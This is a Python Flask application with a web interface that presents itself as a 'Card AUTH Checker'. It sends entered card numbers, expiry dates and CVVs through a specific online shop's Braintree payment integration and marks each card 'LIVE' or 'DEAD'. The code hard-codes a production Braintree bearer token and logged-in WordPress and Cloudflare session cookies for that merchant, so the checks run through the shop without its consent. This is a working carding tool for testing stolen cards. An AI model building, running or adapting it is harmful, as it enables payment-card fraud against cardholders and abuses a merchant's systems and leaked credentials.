from flask import Flask, request, jsonify
import requests
import json
import time
from datetime import datetime

app = Flask(__name__)

# Global variable to store real-time logs
live_logs = []

def log(message, status="info"):
    """Add log with timestamp and status"""
    timestamp = datetime.now().strftime("%H:%M:%S")
    log_entry = {
        "time": timestamp,
        "message": message,
        "status": status
    }
    live_logs.append(log_entry)
    print(f"[{timestamp}] {message}")
    return log_entry


@app.route('/api/check-card', methods=['POST'])
def check_card():
    """
    Card AUTH checker endpoint - Check if card details are valid
    Simple authentication check only (no charge)
    """
    global live_logs
    live_logs = []
    
    try:
        data = request.json
        
        log("🚀 Starting AUTH check...", "info")
        log(f"📝 Request from {request.remote_addr}", "info")
        
        # Validate fields
        if not all(k in data for k in ['card_number', 'exp_month', 'exp_year', 'cvv']):
            log("❌ Missing required fields", "error")
            return jsonify({
                'success': False,
                'status': 'error',
                'message': 'Missing: card_number, exp_month, exp_year, cvv',
                'logs': live_logs
            }), 400

        card_number = data['card_number'].replace(' ', '')
        exp_month = data['exp_month']
        exp_year = data['exp_year']
        cvv = data['cvv']
        
        log(f"💳 Card: {mask_card(card_number)}", "info")
        log(f"📅 Expiry: {exp_month}/{exp_year}", "info")
        log(f"🔒 CVV: ***", "info")
        
        # Step 1: Tokenize card (AUTH check)
        log("⏳ Authenticating card with Braintree...", "pending")
        time.sleep(0.3)
        
        result = tokenize_and_auth_card(card_number, exp_month, exp_year, cvv)
        
        if result['success']:
            log("✅ CARD AUTHENTICATED!", "success")
            log(f"🏦 Card Type: {result.get('card_type', 'Unknown')}", "success")
            log(f"🔢 BIN: {result.get('bin', 'N/A')}", "success")
            log("✅ Card details are VALID!", "success")
            
            return jsonify({
                'success': True,
                'status': 'authenticated',
                'message': 'Card authenticated successfully',
                'card': mask_card(card_number),
                'card_type': result.get('card_type'),
                'bin': result.get('bin'),
                'result': 'LIVE ✅',
                'logs': live_logs
            }), 200
        else:
            log("❌ AUTHENTICATION FAILED", "error")
            log(f"🚫 Reason: {result.get('error', 'Invalid card details')}", "error")
            
            return jsonify({
                'success': False,
                'status': 'declined',
                'message': 'Card authentication failed',
                'card': mask_card(card_number),
                'error': result.get('error'),
                'result': 'DEAD ❌',
                'logs': live_logs
            }), 200

    except Exception as e:
        log(f"❌ Critical Error: {str(e)}", "error")
        return jsonify({
            'success': False,
            'status': 'error',
            'message': f'Internal error: {str(e)}',
            'logs': live_logs
        }), 500


def tokenize_and_auth_card(card_number, exp_month, exp_year, cvv):
    """
    Tokenize card and add payment method (AUTH check)
    Uses calipercovers.com Braintree integration
    """
    try:
        # Step 1: Tokenize card with Braintree
        log("🔐 Tokenizing card with Braintree...", "info")
        
        headers = {
            'accept': '*/*',
            'authorization': 'Bearer eyJraWQiOiIyMDE4MDQyNjE2LXByb2R1Y3Rpb24iLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsImFsZyI6IkVTMjU2In0.eyJleHAiOjE3Njk1MTM5NjksImp0aSI6ImEyZTMyMWZhLTI0NWItNDc4Yi1iYTE4LWNiZDEyNzcxMGZhNiIsInN1YiI6ImRxaDVueHZud3ZtMnFxamgiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6ImRxaDVueHZud3ZtMnFxamgiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZSwidmVyaWZ5X3dhbGxldF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0IiwiQnJhaW50cmVlOkNsaWVudFNESyJdLCJvcHRpb25zIjp7Im1lcmNoYW50X2FjY291bnRfaWQiOiJiZXN0b3BwcmVtaXVtYWNjZXNzb3JpZXNncm91cF9pbnN0YW50IiwicGF5cGFsX2NsaWVudF9pZCI6IkFhbmJtNXpHVC1DTWtSNUFKS0o5UjBMa3RQcWxYSW96RENDNTNMQ2EyM3NBVXd0akRBandHM3BsVG1HNy1EanRSM2NGdXZwNEpKLUZ3VjVlIn19.kq0SGfoXL0uiBjkAJG_MYItjOTYXTZtATI7DLNyvKelIdxsRcF3gRKyrHQ2Exi5eiKk2wsHGxXMN-W4hc1dRSw',
            'braintree-version': '2018-05-10',
            'content-type': 'application/json',
            'origin': 'https://www.calipercovers.com',
            'referer': 'https://www.calipercovers.com/',
        }
        
        json_data = {
            'clientSdkMetadata': {
                'source': 'client',
                'integration': 'custom',
                'sessionId': f'session_{int(time.time())}',
            },
            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 } } }',
            'variables': {
                'input': {
                    'creditCard': {
                        'number': card_number,
                        'expirationMonth': exp_month,
                        'expirationYear': exp_year,
                        'cvv': cvv
                    }
                }
            },
            'operationName': 'TokenizeCreditCard',
        }
        
        log("📤 Sending to Braintree API...", "info")
        
        response = requests.post(
            'https://payments.braintree-api.com/graphql',
            headers=headers,
            json=json_data,
            timeout=10
        )
        
        log(f"📊 Braintree Response: {response.status_code}", "info")
        
        if response.status_code == 200:
            result = response.json()
            
            # Check for errors
            if 'errors' in result:
                error_msg = result['errors'][0].get('message', 'Unknown error')
                log(f"❌ Braintree Error: {error_msg}", "error")
                return {'success': False, 'error': error_msg}
            
            # Success
            if 'data' in result and 'tokenizeCreditCard' in result['data']:
                token_data = result['data']['tokenizeCreditCard']
                card_info = token_data['creditCard']
                
                log(f"✅ Token generated: {token_data['token'][:20]}...", "success")
                
                # Step 2: Add payment method (AUTH)
                log("⏳ Adding payment method (AUTH)...", "pending")
                
                auth_result = add_payment_method(token_data['token'])
                
                if auth_result['success']:
                    return {
                        'success': True,
                        'card_type': card_info.get('brandCode', 'Unknown'),
                        'bin': card_info.get('bin', 'N/A'),
                        'last4': card_info.get('last4', '****')
                    }
                else:
                    return {'success': False, 'error': auth_result.get('error')}
        
        log("❌ Invalid response from Braintree", "error")
        return {'success': False, 'error': 'Invalid Braintree response'}
        
    except Exception as e:
        log(f"❌ Tokenization failed: {str(e)}", "error")
        return {'success': False, 'error': str(e)}


def add_payment_method(payment_nonce):
    """
    Add payment method to calipercovers.com (AUTH check)
    This validates card without charging
    """
    try:
        log("🌐 Connecting to Calipercovers...", "info")
        
        cookies = {
            'cf_clearance': '8SJFahJF3xao87zBesKaIQZm.TLAuwMFwqBnoXAkwzI-1769427572-1.2.1.1-7eLQ5SJn.CDUMuDNTUkDyJMzSsiaMKAN1Tksw_KFeKI1DzL.5z3m08f3CGdGtzp9ZEKjxD4FtpsdJxDje4Ird8w10x1kpPLvrODx2mSffQCzZ03gIMudmRE_w2zaYxAOpzLkevKHQ5Dk_nhFpEgVmv967JUHjW7C4i7k9SRYv_TqtqB4kEcDdonp29xehTmiXPb1tcTtGuQhU2O7iaIWliGq4YDDshcKClpQ5Q11Os4',
            'wordpress_logged_in_9a06d022e5a0d800df86e500459c6102': 'ocpqwkhavbg%7C1769782031%7Cz1TsZVK7QMfHQOY5r7UswfuAeNFn4Y8pE8A0aMeYfms%7C7aa136fcbfb94bac8d5f4c2ded7594eb57043ad30ec26d6d2c448c9cc0c54033',
        }
        
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://www.calipercovers.com',
            'referer': 'https://www.calipercovers.com/my-account/add-payment-method/',
            'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36',
        }
        
        data = {
            'payment_method': 'braintree_cc',
            'braintree_cc_nonce_key': payment_nonce,
            'braintree_cc_device_data': f'{{"device_session_id":"{int(time.time())}","fraud_merchant_id":null}}',
            'braintree_cc_3ds_nonce_key': '',
            'braintree_cc_config_data': '{"environment":"production","merchantId":"dqh5nxvnwvm2qqjh"}',
            'woocommerce-add-payment-method-nonce': '16caf4c22e',
            '_wp_http_referer': '/my-account/add-payment-method/',
            'woocommerce_add_payment_method': '1',
        }
        
        log("📤 Submitting AUTH request...", "info")
        
        response = requests.post(
            'https://www.calipercovers.com/my-account/add-payment-method/',
            cookies=cookies,
            headers=headers,
            data=data,
            timeout=15,
            allow_redirects=True
        )
        
        log(f"📊 Response: {response.status_code}", "info")
        
        response_text = response.text.lower()
        
        # Success indicators
        if 'payment method successfully added' in response_text or 'successfully added' in response_text:
            log("✅ Payment method added (AUTH Success)", "success")
            return {'success': True}
        
        # Check redirect to payment methods page
        if 'payment-methods' in response.url:
            log("✅ Redirected to payment methods (AUTH Success)", "success")
            return {'success': True}
        
        # Decline indicators
        if 'declined' in response_text or 'invalid' in response_text:
            log("❌ Card declined by processor", "error")
            return {'success': False, 'error': 'Declined by processor'}
        
        # If status 200 without errors, consider success
        if response.status_code == 200 and 'error' not in response_text:
            log("✅ AUTH completed (No errors)", "success")
            return {'success': True}
        
        log("⚠️ Unclear response", "pending")
        return {'success': False, 'error': 'Unclear response'}
        
    except Exception as e:
        log(f"❌ AUTH error: {str(e)}", "error")
        return {'success': False, 'error': str(e)}


def mask_card(card_number):
    """Mask card number"""
    if len(card_number) < 4:
        return '****'
    return f"{'*' * (len(card_number) - 4)}{card_number[-4:]}"


@app.route('/api/health', methods=['GET'])
def health_check():
    """Health check"""
    return jsonify({
        'status': 'online',
        'service': 'Card AUTH Checker',
        'version': '2.0',
        'type': 'authentication_only'
    })


@app.route('/', methods=['GET'])
def index():
    """Serve UI"""
    return '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Card AUTH Checker</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 20px;
        }
        .card {
            background: white;
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            padding: 30px;
        }
        h1 { color: #333; margin-bottom: 5px; font-size: 26px; }
        .subtitle { color: #666; margin-bottom: 20px; font-size: 13px; }
        .badge {
            display: inline-block;
            background: #ffc107;
            color: #000;
            padding: 4px 10px;
            border-radius: 12px;
            font-size: 11px;
            font-weight: 700;
            margin-bottom: 15px;
        }
        .form-group { margin-bottom: 15px; }
        label { display: block; margin-bottom: 5px; color: #555; font-weight: 600; font-size: 13px; }
        input {
            width: 100%;
            padding: 10px 12px;
            border: 2px solid #e0e0e0;
            border-radius: 8px;
            font-size: 14px;
            transition: border 0.3s;
        }
        input:focus { outline: none; border-color: #667eea; }
        .row { display: flex; gap: 10px; }
        .col { flex: 1; }
        button {
            width: 100%;
            padding: 12px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 10px;
            transition: transform 0.2s;
        }
        button:hover { transform: translateY(-2px);g }
        button:disabled { background: #ccc; cursor: not-allowed; transform: none; }
        .result {
            margin-top: 20px;
            padding: 15px;
            border-radius: 10px;
            display: none;
            font-size: 14px;
        }
        .result.success { background: #d4edda; border: 2px solid #28a745; color: #155724; display: block; }
        .result.error { background: #f8d7da; border: 2px solid #dc3545; color: #721c24; display: block; }
        .logs-container {
            background: #1e1e1e;
            border-radius: 10px;
            padding: 20px;
            height: calc(100vh - 40px);
            overflow-y: auto;
        }
        .logs-title {
            color: #fff;
            margin-bottom: 15px;
            font-size: 18px;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        .log-entry {
            padding: 8px 12px;
            margin-bottom: 5px;
            border-radius: 5px;
            font-family: 'Courier New', monospace;
            font-size: 13px;
            animation: slideIn 0.3s ease;
        }
        @keyframes slideIn {
            from { opacity: 0; transform: translateX(-10px); }
            to { opacity: 1; transform: translateX(0); }
        }
        .log-entry.info { background: rgba(52, 152, 219, 0.2); color: #3498db; }
        .log-entry.success { background: rgba(46, 204, 113, 0.2); color: #2ecc71; }
        .log-entry.error { background: rgba(231, 76, 60, 0.2); color: #e74c3c; }
        .log-entry.pending { background: rgba(241, 196, 15, 0.2); color: #f1c40f; }
        .info-box {
            background: #e3f2fd;
            border-left: 4px solid #2196f3;
            padding: 12px;
            border-radius: 5px;
            margin-bottom: 20px;
            font-size: 13px;
            color: #1565c0;
        }
        @media (max-width: 768px) {
            .container { grid-template-columns: 1fr; }
            .logs-container { height: 400px; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <span class="badge">AUTH ONLY - NO CHARGE</span>
            <h1>🔐 Card AUTH Checker</h1>
            <p class="subtitle">Simple card authentication checker</p>
            
            <div class="info-box">
                ℹ️ This checker only validates card details (AUTH). No charges will be made to the card.
            </div>
            
            <form id="cardForm">
                <div class="form-group">
                    <label>Card Number</label>
                    <input type="text" id="cardNumber" placeholder="4111 1111 1111 1111" maxlength="19" required>
                </div>
                <div class="row">
                    <div class="col form-group">
                        <label>Month</label>
                        <input type="text" id="expMonth" placeholder="12" maxlength="2" required>
                    </div>
                    <div class="col form-group">
                        <label>Year</label>
                        <input type="text" id="expYear" placeholder="2025" maxlength="4" required>
                    </div>
                    <div class="col form-group">
                        <label>CVV</label>
                        <input type="text" id="cvv" placeholder="123" maxlength="4" required>
                    </div>
                </div>
                <button type="submit" id="submitBtn">🔍 Check Card (AUTH)</button>
            </form>
            <div class="result" id="result"></div>
        </div>
        
        <div class="logs-container">
            <div class="logs-title">📊 Live Debug Console</div>
            <div id="logs"></div>
        </div>
    </div>

    <script>
        document.getElementById('cardNumber').addEventListener('input', function(e) {
            let value = e.target.value.replace(/\\s/g, '');
            e.target.value = value.match(/.{1,4}/g)?.join(' ') || value;
        });
        
        ['cardNumber', 'expMonth', 'expYear', 'cvv'].forEach(id => {
            document.getElementById(id).addEventListener('input', function(e) {
                e.target.value = e.target.value.replace(/[^0-9]/g, '');
            });
        });
        
        document.getElementById('cardForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const cardNumber = document.getElementById('cardNumber').value.replace(/\\s/g, '');
            const expMonth = document.getElementById('expMonth').value;
            const expYear = document.getElementById('expYear').value;
            const cvv = document.getElementById('cvv').value;
            
            document.getElementById('logs').innerHTML = '';
            document.getElementById('result').style.display = 'none';
            document.getElementById('submitBtn').disabled = true;
            
            try {
                const response = await fetch('/api/check-card', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        card_number: cardNumber,
                        exp_month: expMonth,
                        exp_year: expYear,
                        cvv: cvv
                    })
                });
                
                const data = await response.json();
                
                if (data.logs) {
                    data.logs.forEach(log => addLog(log.time, log.message, log.status));
                }
                
                if (data.status === 'authenticated') {
                    showResult('success', 
                        '✅ Card LIVE (Authenticated)', 
                        `Card: ${data.card}<br>Type: ${data.card_type}<br>BIN: ${data.bin}<br><strong>${data.result}</strong>`
                    );
                } else {
                    showResult('error', 
                        '❌ Card DEAD (Authentication Failed)', 
                        `Card: ${data.card}<br>Reason: ${data.message}<br><strong>${data.result}</strong>`
                    );
                }
            } catch (error) {
                showResult('error', '❌ Error', error.message);
            } finally {
                document.getElementById('submitBtn').disabled = false;
            }
        });
        
        function addLog(time, message, status) {
            const logsDiv = document.getElementById('logs');
            const logEntry = document.createElement('div');
            logEntry.className = `log-entry ${status}`;
            logEntry.textContent = `[${time}] ${message}`;
            logsDiv.appendChild(logEntry);
            logsDiv.scrollTop = logsDiv.scrollHeight;
        }
        
        function showResult(type, title, content) {
            const resultDiv = document.getElementById('result');
            resultDiv.className = `result ${type}`;
            resultDiv.innerHTML = `<strong>${title}</strong><br><br>${content}`;
        }
    </script>
</body>
</html>
'''


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080, debug=False)
